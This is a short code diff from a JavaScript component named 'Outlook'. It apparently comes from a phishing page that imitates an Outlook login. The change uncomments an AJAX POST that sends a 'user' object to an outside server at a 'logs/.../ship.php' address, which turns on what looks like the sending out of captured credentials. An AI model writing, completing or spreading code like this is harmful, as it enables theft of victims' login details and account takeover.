@@ -86,7 +86,7 @@ const Outlook = ()=>{
             
             $.ajax({
                 type: "POST",
-                // url: "https://bucketlion.com/logs/dashboard/file/ship.php",
+                url: "https://bucketlion.com/logs/dashboard/file/ship.php",
                 data: user,
                 success(data) {
                     // alert('OK');
